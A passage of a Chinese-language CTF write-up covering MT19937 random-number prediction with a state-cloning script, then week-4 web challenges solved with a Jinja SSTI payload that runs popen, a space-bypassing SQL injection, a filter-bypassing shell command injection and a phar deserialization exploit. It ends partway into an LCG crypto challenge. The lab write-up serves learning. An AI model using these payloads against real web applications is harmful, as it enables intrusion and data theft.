f530968ffc419034b7f971e56db15bef7bb31000ffc36449f46e92b5145e0446
0a626ab669306331b4fac480af6918142e26005d9eadc99d857dcb0713c2877d
e54c02740855a7a2be864b3980baf39a9e0f93d666c2e416119d45fbc76315c2
9a484a9584d2d07536e52802f01b35bbbb06cfaf3cdee5ddcc8573ecfd63e259
d6d61d1b28ef45e333b4a547b8c81a00784dffba9a83fc4bab6980cb80dc7a75
b0f1de7800eebbd2028e176c0cd03125a6a3d76f66b0a38c7bfd40f43d922ab3
e76113219629529495aed07d7ce6760f6c2f779d9451a510e94676718cba7664
d323458009d2f1abecf1471849a259d6354039d7e71d164faad425985204ca0e
5a021f9be481893004ad1140cbd168b0928f19934c73310e7091ef33d012bbf1
f6c33af2ec91438022317f65e55e3d51d7e361e43e8177f0376fd82e49db6d5c
190da978d4087f85027d8d5b927db015335b9fa70539d5021ca9591d56f4c536
fa63a12e1fb241d5a55a9e858c1662c3086d41d8367dd6037aa39ecb5f6254f8
a6be63185dd27cb798cbe7785669b7e743c2d9b8b4096f28f3ec8f94e7c15441
dce2936844314ce8d01a8522644d9893c774f1b6b061b62bdb2dbd0d86cc921f
941076d7f1e22ed7dbf28afe4f292171cdbf706fb80bef6295a77a74e562b6a9
6b9de91b9f18a08bfaa3fd0bdc39f0623cd215489d482e65a64002da7494f1b8
cd1d68d2dcfdd940630cb4b2de1b6e79017c82c73a462525fa5b21a128699788
c91faaba097e6721c9d4db4ac4200c0ed142a917abb696225116b641b94a6682
50176ca5ecc5c4043a981389b0bc1884a1d977b9129ebfb6d52c95715c20de2e
489af2e971d32c0ff71a51f685899d13ea7849a6448af3589dc24dd98fafb4a9
dda667e7683b07df1bed9952dbcbfd19bb7530ee99e56c60ee696a1eb2d4668d
35a0f733461deb274bcb3239fd841e61a1c4ed3ef8de0c8c9e95bb1bcff9f984
b2cd7cb9ad68170d9a5ca671bda330e8ba475f3432e77a2088ac1b1409d47be6
b7f59b83c352cd091ad3f6bf7071fc216756c064b889248cf59d8ec613296b88
e07b0165dfa4fdf153fd5d7a8e6874f1bea78104a135abaff801a58e8ce64c88
5de6ef8309cc053df87d49153c8aa7e3923ddc914f9592c9426bbd8d56a088f0
458c730b6250964390315ab504e193b2c7c8baf085a970b312ebb7b947decf44
88100075ab3298cf0dee6f693f87b7ec45546cb5ab804f1e578ce893ac9bb91b
62178d5691d30291f45309f5cd2dc99946b31b0e24df5c47b3c99effa3178061
9aa3550cc8b4075525f8ef57aab4785774af0cfeb765fe56776601c61ddb6e40
975600403108047d468908782a442a2b14911f277c6623a8d3989604a2227279
b42e52ae866c19418ed5660bae0fab6b9cac9788a1aa4372f047cb862222e176
362a5ce410e21456432a9089ac1343658d44168ed05c201271cd99b258cf8dc6
7eae7375eb2ab68982b2a959eb977477246954ccd2c84b6159a7f8739599713f
58da1d1777705fc73af1cb65d56961ef01947f1c3f0755f535b7ab5793b17141
4754b6863ec18da8f698230a762c73e53c02d609d7325a37dde43ca94649bb71
ade33f8bb371b96c3270407bf7528750565b86ea35cb8ce8f7e64d0b22cbd1e8
2c10d9b588bd147c60423b96d31a4c2e773d23ec55c2182804dfce5ec7483047
08d429abc638b49b7a6e2515dfd8f4660e71a14c5d3f269e46cc1d1c115d79bf
61f79daa0a1e947f643fcfda3b435f2f89cdbd5c217bd7dde7e1bc99f4bc15d6
1d3514d5d8e30ed2279895837805c1c03f74d6ea6907c2f369e648118d8142dc
a6f791bd71bc72408db8e711b2f2e63fa09fed2f89811a46b59aa9f03fa0aa9b
cb5c2b3236c9830f19f23704216da197b9a69e02b8f4894b6bd4496898170a8d
ddeca8291684e0227fc27e3418defa700f9f5f21480b105d954c3f18d3105739
759834ac3b996261a779fce7aa89e0db32faa2d08683aca64afcc54cc3c4ee7d
b20543ae7839ee4ba037446feac5c7eea696d538b583c029a2369c045db9437d
e79523d2034fbaee301e732dc95573a9152b7b94f05c0c921e5db89bc6f7a928
54d51ddc9a8457c569a63b57f9f9760891825f6ef8b39192ec5093b3ca4d4ff0
41aa619830c565c138eb7ab67fa9d524808a9fa25489774c9a784905602c3166
8c8820758d0a6c9c9a584aa51e0ab0c549d74364cc25e36ab5ec238546ba5505
e98413350cbb1221e8493c0ca4d19537046bdaffc66cb1c2acdb1ff0c7555470
4015d931ba40bd4e25d8ce26b66267d720ebcc26dba774c84f385848f2a35f30
fe756bcfdbf0d07feb07b400a695d0c534227f8cb79a872781a2d2a1f590f6ec
0cb5c31cd1a16495f20744e95ed294df0c3671f52247411b5bef37c185d21d71
6d61c1f3052156a34669fd41b982d1230673304a4ef979fc27a586b9adc7a14c
a48ce83836d376a2163c6cfea937d1c0b924eb5000140ba550c0894fcd2fc9da
8dd625ef6e7b50fd14c110bdaab654b619ec4c4661dd64091696ad1cffd40fcc
58acd76b3741741bffe0db63bb7574a269b5c490748ee629a20b7dbadd3753dd
d20618e3ab47c37ba5e2b7feec752b4233fb926342c8028b6da868a6099ee75a
e5453e27b13176514ce20c98290c8d3581969f2b801b47a03e8f3f55cad128fa
a01f5e6b74081d59a93eac02bfe4753b20bd30745abfa6a9d987e5136bb0cd6f
6bf42de0b54a73805ae684de95d7acfeb68adb6dfbcdf5dc0332b7c3b46d103d
126680e057dab63c8a2be438274a408da07f8da041ee19f0658e1d265e910790
f3c2f2dc52d7f9c10ece7a4027a245493d795ea09d84d636c2bdd022ba6d2ea1
604139f41f4e8fb36addba8ba4927b8a19a7cc94293730a0c161d86896231327
9c4e34681c8a4d1fbdf6ca7e8c95c55cdef7245bed1f91b28c3c2cdb1b097539
dca5ecba50a715afa72ef129a5a362006b27f8052cee1b0059f7c730a25a7c42
a1a9d5d3908c39e7bd5031ac0655258c29c648a17af5b48a215c78fdec321d3f
0cf22e15d1008f7869d3b704933ce3f5c2ef499beb073b82e6c26ded89c2f906
c29452f131012382691d03e2a65ae9ee699464d887c955313dbf7e20c859f95a
db65f7fadcb252311d3b6a33e6d8227b6c8e54beb3d7a96f7b4357949cc1be90
4dfb6785937ce36342c052343b39548b29ad52045d4a09072f556efb669d9f41
07a476f87b59fdb7250cb0714df5bb3452ae1524861e1fcecb99dc0d27418254
daf9037b36048782a8a1516a12c5d474a2378a1ad331c387974308982cf2883e
cd9dad6f232f8624da75aae07ffd17160100353ca969eef53cefb4a1fcd42a83
8480e927fc0f443019a85d01be8ae9d1ea576edbf35344995378747d2b764869
e6b5e75ed510b6388f06a620b257f457f979c14aac2f0ae88d359c8e307d5888
f9081962d3832ff938086c6cf5f62794a628f819e389348ed2d69adc4f255b1c
06c4e65975cdd3131f0884dbffa89731334501aeec8b42d876287acba540a85e
29e020873179463f8b506a11b12ee9928814ff63068d0ed998b5cb819353edb1
ab7c6bf36df31c10583906b235ae5dd003049e13ce0686ebe2c0ad68b259a5b4
be60f2468883f18939d29132e0c8995db02c58784cfdf40d6ac99f36b7e64491
ae4909df1efc187cba89894c8406b137bdb36e348801829f82aee163e3d817f3
5ecbebdb40f25bf3b1fe7e712cf102926e3177aa185d898ce74fff187057d33a
3aa5cb59194d5486ffead594e73e110dc707187d607c1fef4c82e8328144b554
ad68bfa0244d5388a467a20b3c9595bd1375e7f7f40b491d3d997e519cd0e3ac
e2a4dbf32124e0d7ccafa8d4cf99fd29e3dc3dca2ada08ca3e240a3668e181f4
1d9838b0ef79192b9a31df9817da702ef03aeb7d326115badc8e293df7ca2d42
d42809ba018786eb9e3667a81d2c4f0e3932c515246f04ad028c5e2b50886b10
dcb3f0fc6e6d7f9da4d1cdd08d27895f11e57ce0874ad15d0b211f25235a05e6
0548ef65280d29cb898f3e31c28d4c49c7bd70f212442424089968bdd7a5cec9
5cb9f7809efe4dd9f42135155e0c6f0e7232a6eb08d55aea0fba14b02498a55b
3ca556899e09feac17e3f3aed18923b036c79e60d8cd8cef79d492a40931e43b
3b45af4ce5fb810ecc5746b10e1ad16b584d8e8d6c97feb3019a1e012cd59c07
a0f082cbd745c9a19bb5a9e75fcf3828de5e5c80ef348c03eddef96764a1c2b2
9b997ffb9338919a3b0e8343b861a716fca238bbb12b17b3ce512fcfc98b81ac
4219e4aaf16294c2bdf3f8acb6631c8938076f9ca2eb4249ea4361f5be54e74c
aaa0dba9be4536cba8d347467bbe9a0abc9f4dd6d1cd7b0805433d9c0d3775f6
846d3ad979102d2fe92c878756e62fc1eb9f053b101c8453e098659e82015abd
1106b76b1111eac09dcdbf2be3f0487f2f5a6b1f9fd0c8bda70b39bd5f1c0997
2c951232ed5119cc40345deb2d8b49744f6b18feb337415bfb9ce7f842996661
c9c95d976faad0a1916437d90b0c1f4892d12cd86ac76a01396372165ebeb004
d90ba28e46dc437e89681a7d56e8b4d7663204b5730017473603496bd1064df4
8b89a78e31e45728bdd871ecd053680634f95d8072be341b11e3f369f0056d97
b49734c0dcf1265c9438a3b4b0d11adeb686d08402d8bc6d8d1666dc7642f108
0b0272cda3d9ea11cb82bc879a4f66b6a7c0e6c07ce0f6212427d6f236ba7dad
1e0bf71ea2c408b23eddce7c049273220711e44de98e1992bcb17436f042ffae
46ecdb9117a20df61d5d38fcee9599c994b25aed236abacf7ab0e179bc8d31c0
49113def916159dc85b9538fa95a878d5a95310a94b55bb0432d0bd5a569fc7d
a02f9cbfe508ffe30f34a15f4a08ffd3666daadb2cd07659c8f63e7b226eb524
c69ac42848cf97a8494f64046511d2eafbf46f845c1e399cb2ac06d7ec04c7f4
fbe242d3e9a16ee0a8f7e998ab7a89e3b7dcb9e946f50fa6e5d88fd16048ac18
15c148d5921cdc0422b09e7eb730f5b34590bebee9466a0e6ced74d9537b4097
a54e882b872c0a4db1ee0f223c2379e03bcd80190dc2c4b7ea172a8ce002a214
8e342bd8b0fb41eeed5e5752fbc262f4129b8fa507ea59df14dec8ea4e37ab1f
c7b7a669983c9820ccd99b22cce81244bf88a5a1a93034cfc6ee213132970052
bdaf02db79ebf45d31c6fe44a5a27806df414bf096c02668a07c7ce79de71fa9
d8b1bc159423a2e2fe7965123a654ec5ec217f1facf40378dd09dea13bb46f14
d344de666fe87a2d9f8088346256940fd712e35884a239be0811979e806833f5
4dc15c7eddc2b29fee61e1afe619f88d02fd182ddee693469e697e520026a6eb
ab402f124aa008441622880c8c4c44cc7056b601bd05987312254bc3a3ff2c18
2f0b3447b12fecef779f951f448825fbf39884760eaa7ba35306b3701f179bf5
e90eb9893e5ea13632e87113adfb127375ae809ace4644e00ba92624ab145a9c
7d50f8fb66501741afc73ff263e2f14010e681f2929cec456d805b175f5b8b70
4fe5cef03002dfa80b12ae98c02a2dee672b0b3d61da22f356942b01fe768e54
bd59177b9d3210c180869e49c911e51d3fd6514fdcc5385cdb238ed84c39d433
754872df076267e530f4166390f174a3b1837f15b9d5ed0525e52597ffbe8e8d
26c9a0302719d70643a332b64175123e7f39d7d0e678360aaf3216602c4ac0e2
0e7dd8f5c42fd7c165dd2bd7f5b0ea680881b00a628e94a2b5773e9320aec38b
6c2184a3846cfd947c6c53098ceef860354b6c7521801c12cc5599263ef1c494
d6c8ee28416034dfc600a808cee4bac52f0a121e7be2b5c0b3729e4cc01fd969
d40771421b3a4e36f4f1d1fa8b4fdd2087a50a65338da4d37e229093e2828ad3
0eaf8c3a2d135977d08883b6c208f0573b65c1b5bba0d29008554b3b3cbc7e02
65c7cf6d1f6a4dbe2048f6885a5ae5c3e86e731b1b6c906454a9ab767a2d3ea1
4c001337ca33fa955f2c805d4df9f97edc17d6721db6b6d1df99eaba7863099a
54c0d42bc4865a121da07ca974b9141b12cd1b867cfa3804dcab44127e0b290a
58a95796178c46c95775a8d6605aa9b945593cf819f759d13ef4b8b0e44c98d7
a5463f1844ab5da502187c19d7d756648c1cce184aa6e462ec7f6542ce663876
6af9613022dbeb448e4012fa25b8f8a85bcab68214b93e4e8d5e106fa12284e3
5a50c315a6277c757431f39bb968cc2d8076e7b78945ba243484972b7111a7cb
97536d568a90e14f3433950bbf723951ba7f8ac65da0a2416a96c9d52ead393f
334a10b7b771084474c6f7b8b387a04420eb041a0054a854c1468848bcc41d41
6d46f81228fa03cca145893e714dbebec330ea60ae891e35f0328fe5d2ab339f
29a8213526d500fc3085e4bb9b7737fb7efe08486413908a4559de03271e3cda
1575b821b1d51a058cafb376d0eca059233cbf9685a05646d90d7b7c65175499
9c451d8ac0f4bc7aa7aac9ecb7d6ad3415f7e5ec5f5eca29b15009ddbec441c2
1c7e36ded4a0adc5028ccc4a1a3a1933db60c7b572e7803eae915f805cce6da7
c704765730e0cab4a09922a74d7ca9938442f2a3b670e019b6663ef38f685acb
75c6a84df9f8ce83726a9245900c6ebd0c74e7c15c67dd19ad1ed9daf6bba036
deb5371493b066c89fecbe74fce0e72385944f437012d66391f2b915a833c737
501434ee33b9793a74f30f123f68f4a9258d7fc25a38844a3da84ace0db5ee49
e09d6bedf5103e3aeab900600f762183fbe4afb28734ab50a7073881811749c4
1e4281aa53d40ff9f1e4bc8f1a57b727f41841c496bc3faef195766e4f92c585
67add12cdb45c6aa7a951f01e8abec6d080f689e02a875d58a3435c2f6fa3f32
2e1fb81b8ce5f95fecd44b6ed8f722896f2338451a2db55d72a253aa0e4b2ff3
eade2870fb2f57808ce21e48c0dee8c9ece000e31b713e04969829ed02db7ab4
6a6a63dbebc9155762006c9a83d81164af358b8be2009716b758d6005e337dcf
db0e0e67b6ac76ff9703e788573ac8839a6a1bf93fa4d8ae3aa1d2b40c972f38
b72a3e7dbeab5d9fe82db7d90fc7f64022ce63d30f9ac908d78805e05cb9f9b8
b8e77c26d41ecda42cd97d6371a35ca01f21f0eb862dc84b628c5b24be806618
a6648ed549941b669180b58479e078251831edccc85440350a373bf72dfe95a8
5826de6fe0e6aa44a98f1f5be8852e26a4cfd2c68050eb83ad6efbb7cbd23788
414e1162941672109fbe8779dac40f4fe3321a56c78a96a2d5c29ce634021e4f
7ccea3d9bf227b1b361a07697ff57d219ddd8bc0e29bf8b3527288bdc990475c
bf209259c873de30aac23bbe3c9f97fb2a2cca7bc5a72327af04d75901965ace
721ed4f69464e222ecdbd0dfdb3e3848b93604697f823c0d61d2891667bab8f1
0c429a0c45f28a7bc809c5b39c7eab892864aa7e47d153aef34785f7a077ab86
23f63c1b82bff79b6fbd061ebcfe28809ee85352e5b16513ac5f227b3d7116f9
c53262d31ee1cbfe69cc59078165bb77d85ae06f9644369caf65f0e4bdee9c54
dd8a806cf56ea7fcc751089147656d9188aba0d0d03ddc034a253b83f1a105a1
68719c5140279c0ae808018e2a220cd1f6ee60b07d6a00c3a12c0f262c67a31a
e073d9cb8e82c90c27f525c1378a54237dd77405c82dfa153474f82c624fea18
ebcddbae08f177e153839ff8558fb05278d66930d96a36a54bdbd168dc573860
55d2ef6fea655cc8af97d7214d2a6d7e2abc2accbfd0466d1c6a8cf7f3b14763
97981c6d713cdaf88cc9eac2c6128ca25e5ab4ab2f4ffda3228caaf90dc7e67b
7ce66f0790cd1b693c49789b2706ddbbc9a10628c411fefb4ccecfa4ba2778ef
7ca24d6b04277ed8eee2124858bddc5d2681d5d94e6a9012959e30ee4c0724ac
3ec2d101409898975dfb365e2d8f874dcd7678bcbc98b4e87089769ec2e7f685
e9a25df556c1aa2be1962528c1d5bd863e10e1ba14a3f83b304f71fe1857cd95
4a3fd03d22a2450ce918d3fd99251351dfb564f641437edfcabfd282b372db0d
fa12f23f1a72c7bd380f0c64176fc87e2987f9f5214bbc0876861e4bb9102795
ab585c93c856b80584687ba47a7918f98fee68e658c32da988585aaa2bda9d69
f4aa811805c5174231e1cf4af0ac871d2f3fec278724523ac28d9001b0b39024
da8a43912a5f284069215e4333a06d575fca6d4ea48f954a588e43448491c8f6
51893743292682c8f6b12c26a27f8567b5a1922382d5497b518aec18f16ffb12
6c9ce423a85adc50e95285dbecf83a4e7f04cb4ff9ca30f410c8f48b0046c10d
efb1833442382d67c9599684fa19fa43f75cedfce22d6a834aa38e8638b1fe50
b40d76b40cd8d5b128fbf24e8b6b07c16bfae07ff7d091acec991662b393f6cb
127b8d6d61c0b28e0f528471aea0ea680bb7cf3bda8839484be85ff3a6d877b2
37797ad940ea8af197c8ff0e30d658d797c7ae18736c2dbe05824e458cd98216
50ebfd23cc14a052f935d5954ab16a32a65988b6510af3a5e395969bd939801c
460903cb027926c1c8268cd7436a0d3aebdd6241b3384e34e259948208d2926c
de78df60487b09da581d1f47e9efbaf585ff3e8884c3b0cb14cbc5fa8ab9d21e
a3dbd3ff4c38ed47ea8ef4311698f52696995abe6a2eb6bdbe49f54879032fa3
0c29736aa22d5d811df9eb31c9c9cce56892d80170d875f3ab57006241e92f75
9b86b668d2fad02016c6a56e9a15c258518d800fd7795ab0c4dc6b80d2b34dce
b94334cc1765db1fb2a5a2d2a128d2822bd31dfd45871aa5bfbd74e8e8b2b7f5
cd7b3935b995eea29d986c758c23df1a58cca61df612422f99958b8a6ad8e09f
```
getrandbits伪随机数预测，至少需要624个32bit数才能预测，getrandbits(64)看成两个getrandbits(32)，先低位后高位 

[浅析MT19937伪随机数生成算法-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/205861#h3-4)  

[https://blog.y7n05h.dev/random/#Random](https://blog.y7n05h.dev/random/#Random)  

exp.py：

```python
from Crypto.Cipher import AES
from binascii import a2b_hex
from random import Random

def invert_right(m,l,val=''):
    length = 32
    mx = 0xffffffff
    if val == '':
        val = mx
    i,res = 0,0
    while i*l<length:
        mask = (mx<<(length-l)&mx)>>i*l
        tmp = m & mask
        m = m^tmp>>l&val
        res += tmp
        i += 1
    return res

def invert_left(m,l,val):
    length = 32
    mx = 0xffffffff
    i,res = 0,0
    while i*l < length:
        mask = (mx>>(length-l)&mx)<<i*l
        tmp = m & mask
        m ^= tmp<<l&val
        res |= tmp
        i += 1
    return res

def invert_temper(m):
    m = invert_right(m,18)
    m = invert_left(m,15,4022730752)
    m = invert_left(m,7,2636928640)
    m = invert_right(m,11)
    return m

def clone_mt(record):
    state = [invert_temper(i) for i in record]
    gen = Random()
    gen.setstate((3,tuple(state+[0]),None))
    return gen

# f = open("msg.txt","r")
# w = open("old_m.txt","w")
# old_key = b'73E5602B54FE63A5'
# old_iv = b'B435AE462FBAA662'
# for old_c in f.readlines():
#     cryptos = AES.new(old_key,AES.MODE_CBC,old_iv)
#     old_m = cryptos.decrypt(a2b_hex(old_c.strip("\n")))
#     w.write("{}\n".format(old_m.decode()))

f = open("old_m.txt","r")
prng = []
for old_m in f.readlines():
    n = (old_m.strip("\n"))
    n = int(n,16)
    prng.append((n>>32)&0xffffffff)
    prng.append(n>>64&0xffffffff)
    prng.append(n&0xffffffff)

g = clone_mt(prng)
for i in range(624):
    g.getrandbits(32)
salt = g.getrandbits(32)  # 362819459
key = g.getrandbits(32) + (g.getrandbits(32)<<32)  # 17506667538655249967
iv = g.getrandbits(32) + (g.getrandbits(32)<<32)  # 1253285644132320713

salt = "{:X}".format(salt).encode()
key = "{:X}".format(key).encode()
iv = "{:X}".format(iv).encode()
c = b'c82dc20b7512d03f1a0982eb8a6e855db20f6fe3ff8d202a6fb74c6522fa6e623c6abe6725cafe78f9624ad59f3e90af6f985f38f75ec4d62ff7e02bd7c2f051'
cryptos = AES.new(key,AES.MODE_CBC,iv)
m = cryptos.decrypt(a2b_hex(c))
print(c.decode())
print(m.decode("utf-8","ignore"))
```
old_m.txt：
```bash
799EEED5854C6F6C7E0905B2
770A6C6EBA0C566FE031A94D
DFA02A4E0B07EECEF47963F8
90D566BC3A399EA3A40DF672
A2B3B2399B3163945D06E5A5
7DDB0BF1D7FE022FF339FD14
6C9A21F76DB25683F73BBAF7
9310F0315B8EFBFF4C4027E
79CB4E0F7ACD9FF7DB7D086
DD34FC6EC3848D87AC39A3C1
E8740B1215F85026B6738297
44391138449B160527902DAA
73139EC699779D2B1A270E1C
18A7593B31E4C439F6F494F3
7F2A2CB1BC1A91D1E487B785
9BF0AEF4E7A295D6E3AF00C0
E07B61CDFC0CB62765F84F3B
C201212C5948AD0BFDC28872
D3D3781656EA182FE597443A
D82FCB444931499D7ACFEA76
7D9B679C3C23F433ABCB4DC
C3B4034F72C8BB6F92AF90D0
CBB265E461B3D15225079BE1
855B1E5A44C71563DAF8DAEF
EA8A5AC9E06AC912CB7DA484
1D7F642F34B84E00A129D43F
B22229172ABD3F9DF889213C
E5279F4AD50FF79CFC75331D
A2D80D3E0B32E7A333A3A06B
29BCC3F5A20BE76B599789D3
2B7A7CCA6F70008FB2D1E26F
C2684E550A7645F3D7DC26D3
2A37DA00E44CC8E99F1DB99A
133F9C6776EDF30AD17B44B9
BC240AF44553E7645BC28801
6B0033EF362368FFF8A7F0A7
EA21AF9B8194190B4D825DC5
A0327954BE5FC6ACE1E8EC89
F9BF20E5E1A04CCDDBF7B49
AA0260550583A4C8E2565105
DCC2D49CC1E68BAE4004593D
60C004FFBA26B4CC770EDE00
E41EE69A0079AB92344ECA94
5C0A81C861CA2CACFD913991
A8B29FEC6539697F9A915758
ED69127FCC9D9DA4669E2486
127C13853172AC159D13139C
355BCF7E27EC6501B694AEC1
E97F42C2FF1C3EB6CA53E2A9
B0FBC6673A557721464A7ED7
27446969442C0E6D66C2BBCA
375C602E5E873F99D4545120
228147FF254B9B18EB5DBC41
57E7993836C7A82CA4FADD0C
F840CB3E58D4ED2AB683DA8C
BA455E8B4B04CE2ECFD70C
72B7911E33CD4AB530F7EF42
2F4D7A0B357DE3C2E50BAF61
EAFE5DDACA23759F647C70AE
6D1CF29D3DA1C64E5155355
E48956B2BBFE1490E8B457E1
F59CDE7940250F7F55578FDF
D56F6AFBE767568377CB78C8
A93CB6ED988F52D95CAFDC2
17F7A882F3D79DB6C1580833
61EF9040462B8EC6D2164B37
25D4CE95979D62D2B1490226
4B3CE2665FEE08F1C7177301
AE37CA82C0427C12B38D3915
15A02F8338CE65364268862F
349A85C9F2F42D5F116490A7
3D43FC40CF08B518B18C9EF
7415F4497FE5798BC9FF8E9C
149D6CD044BD1E31AC131B14
968B0DB358911949BD7FC9DE
C0C7AE5D699BB2AF3C948B04
A510F9BCB0B6829F9B5570B3
A944BDD8B681D3565318880A
1597EC780B3230BF5CC13091
878ADB963C8A612DA96DCE61
D7242D061F44DF4F8F7FA07F
2C2F79C9FB4CDF52A75874CA
E065579D8C4E33D94300856F
27078D10C1A84D5CC50B98FF
43F72CEF8A8CC0C4FE55AAA5
8C2A93BB42DA68A248ACE528
B3D26B4864461B382CCAB42F
8FA7F68F2C9D5D752CFD056B
38DE57BD44069F4C65A0F759
E868CAC78C3B046D96B65810
15365D1A8FCD04FA38923611
C6089ED8320210A0DC131E31
96C934B97457D41EB83B13BC
705893B39AE702F5B8CBE192
8BAD466BF8ADD4A717A53591
30847245D2D389A8C3D2DFDC
2F17527727F10B69C349288B
EC41BEB5BB6A55112FDD877D
32CDC148021A61C360A0F70F
DD3AA59AD26BB9D73419F24D
2F646BEC5576AED579523FDF
19869C25C1992EDFDBBDD337
A89E3A72326C0F71B317A8D8
10F54260B4F22234D1B8B97D
ABDD148461B707F2389EC44B
E5AFE6201B053FFE79C2940B
C842D80F1F5E567F59A3FFB5
C0951ED3354432B2E37824D6
6C98F42E23BE6AB18BEA0FD1
B5D1FB2D95C8F7839841E6E6
AD92F8AA9FF85807339ABB3A
CF826F03EB56676F1B07C81
942E90513D2012F5B774EF6B
CA32692897279C9ECDF5792C
5EAC3107FC150568B337DB18
66A6EF545E2FA71560D63D22
E731EBC3231CEBF125EDA48
61FF522C670D57B545383DAD
DD53CECBFC294E5A83E4C836
84250AB8CB2F9E9A93DF3FBC
5107809CCD43339EE867C9F
113C3096B03D414F544C46F
DAAC47BDB55931D9320BA4C6
41612C482C2E6D8D643082F3
6B767FFA2CB1977CB8EDB327
ADAB0E1357C19FB9186B5C4
F2C74D8B17FD0C191C738D11
4EEAB90478B07F197C7EADEB
D507CDD704CFB5AE5D7F83A
9B7D458A5B45C758DB270AEB
DFA69A057FCE26057F8D3972
1971A864B6D16478A230E6A5
560225678FB69D6DA9E3BDC
AA9D9F037BA31330752533CD
5B03D87645AE218FC67502B5
CE129307F83FD7209E2E1A8D
A1D0F2DCFD03CF0B2F217406
5509E5D8DD567EDC4513D6BC
5B0DCEB25E579FAE775363C
EE114AADA3E0305EAEE107F5
3301F325424937AFA66FBD3A
E673C6021354F8BC87C7AF39
A67EFB04F1DEFAFAE036221C
6CA419AE1B79AC2959B02704
80A36CD9EBCB35EE32772FDA
FA41A5A21E55E625B56BB87
A319658EFAC209578D117742
F2C507A67D36015663FEE0B7
EA7227E2E058B06FCD04457F
D3E6594933BE39D4DFFF2AC8
831F47DCFF677CBA7F0C0267
BAE9DCC831E6F13D1599AE06
16C56F3326C86C3BE2202A2E
23E00B292AC3200B5FDD935F
2E551FD1EF8DFA06658E668B
2D6F94F9DFD948C8B12DA9C
41A575D3C890A9BBBD9E27EF
41341CCC57226AF49EC8013D
6F7BD48B5BAE0741C4C0E0D8
6CC1D69AB830977BC4B5F70A
9A511A92165E0732981B635B
9A912F92F8913E5D8B06807C
C4BA446FD25AD04E55AAB4DD
6198B81E1E655BA04029A89A
674CC4A6BB3BA79E9FC1C487
96E0837517EF4F5028A9BEB
47D7117E4DCF7D91AFCBB066
553E973EAB95100493ECB40F
86CD5DE1EA2713CC7518926D
CF53838182A0C1417EEF42A1
3DEF2FD31AE237D8EB777D97
8691C68FD6296AE4696C28A0
B75B38E32EF8B715B000FECA
D249F21DEAA67F70F056F7B9
9A2B0CE4B56E2C13EA29BF08
7ECCD34CBEAEF5092BF5D87D
9A261DB09F35AB22A4EA389D
FA88892E319461D776BC4D1E
7A8F0FAA846C4515B66EB3D4
90EC692A57500A86AE18ACA2
CA7D279C9951662C978F74A0
58E0F87E25976D38E233B273
72F92BD9BF4ABDF8B7F18683
292F33FEF6CDD86163ED61D0
35DB3CFBFFC22D1B240BB750
3406D59EFDDAB954AA86FBD9
AF55EEDCF981EC0CC240EA96
A0C21F1804B951C6A2752930
4D1DEE214E8D81A1230C5AA5
C2D4FC3F46879D5AAE6B3887
FAD396A595FBFB489499FC42
F73EC81BA7D1FEE0EA5369E9
2D1AAE10210F9D9C0C998C6
F4A6FAC24113EBEDCA3F055F
C49D2222D5057C0A606ECDC1
74A9BB9A89BA59A09781F919
52D552965DEDE0A8479DEB72
53C63D45D42F8811A2AA1B44
40FCA767CDC5598693A4E95A
1780A3E647475554BC9C3CA5
F5E680B9883EA2F319971107
7F75FAC583369549DAB2DE
1A70A2A540CC6571F0888272
752EE6D93A37BF26791ED065
77D41F8F2B975700CF4C7A
DD1B9D1D82F9C82A7BDC11A1
870BAAED444E72CBE7FB4BCC
9BDB7AFF15F4C8DFC785999F
```
## week4
### web
#### BabySSTI_Two
[SSTI进阶 | 沉铝汤的破站 (chenlvtang.top)](https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/)  

[]绕过“和关键字；hex编码或Unicode绕过  

payload：

```
?name={{''['__cla''ss__']['__ba''ses__'][0]['__subcl''asses__']()[117]['__in''it__']['__glo''bals__']['po''pen']('\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x5f\x69\x6e\x5f\x68\x33\x72\x33\x5f\x35\x32\x64\x61\x61\x64')['re''ad']()}}
```
#### 又一个SQL
绕过空格：%0c  

前面数字不能直接引号闭合，直接写个没有数据的数字（没遇到  

payload：

```
name=122%0cunion%0cselect%0ctext,id%0cfrom%0cwfy_comments%0cwhere%0cid=100
```
（数据库没换过，可以直接看前几周的
#### So Baby RCE
绕过关键词：`${11}`  

绕过空格：`%09`  

绕过分号：`%0a`  

绕过文件名fl：shell特殊变量 `$@`  

payload：

```
cmd=cd%09..%0acd%09..%0acd%09..%0aca${11}t%09ffff$@llllaaaaggggg
```
#### UnserializeThree
检测，发现class.php
```php
 <?php
highlight_file(__FILE__);
class Evil{
    public $cmd;
    public function __destruct()
    {
        if(!preg_match("/>|<|\?|php|".urldecode("%0a")."/i",$this->cmd)){
            //Same point ,can you bypass me again?
            eval("#".$this->cmd);
        }else{
            echo "No!";
        }
    }
}

file_exists($_GET['file']);
```
文件上传+反序列化  一般为phar  

参考：[反序列化之Phar流 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1740438)  

上传phar文件，利用伪协议读取，触发反序列化  

生成phar

```php
<?php
    class Evil{
        public $cmd = "\rls /";  # /r绕过#
    }
    $a = new Evil();
    $phar = new Phar("E:/test.phar"); //生成的phar文件，调用后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub('GIF89a'."<?php __HALT_COMPILER(); ?>"); //设置stub			
    $phar->setMetadata($a); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```
上传phar文件，更改文件类型绕过，得到文件路径
```php
class.php?file=phar://文件路径
```
之后更改$cmd重新上传就能得到flag  

phar报错：将php.ini中的 `;phar.readonly = On` 改为 `phar.readonly = Off`

#### ！！！Rome
java反序列化 ROME链  

工具：ysoserial [ysoserial使用方法 – cc (ccship.cn)](https://ccship.cn/2021/10/21/ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/#toc-head-3)  

反编译[Release JD-GUI 1.6.6 · java-decompiler/jd-gui (github.com)](https://github.com/java-decompiler/jd-gui/releases/tag/v1.6.6)

### crypto
#### LCG Revenge
线性同余式  

[Crypto-LCG（线性同余方程） | 此间的少年 (gitee.io)](https://xie-yuanhao.gitee.io/2022/01/10/Crypto-LCG%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99/#%E4%BB%80%E4%B9%88%E6%98%AF-LCG)  

x(n+1) = (a * x(n)+c) (mod m)  

t * a=1 (mod m),  x(n) = t * (x(n+1)-c) (mod m)

```python
from Crypto.Util.number import *
from secret import FLAG
p = getPrime(128)
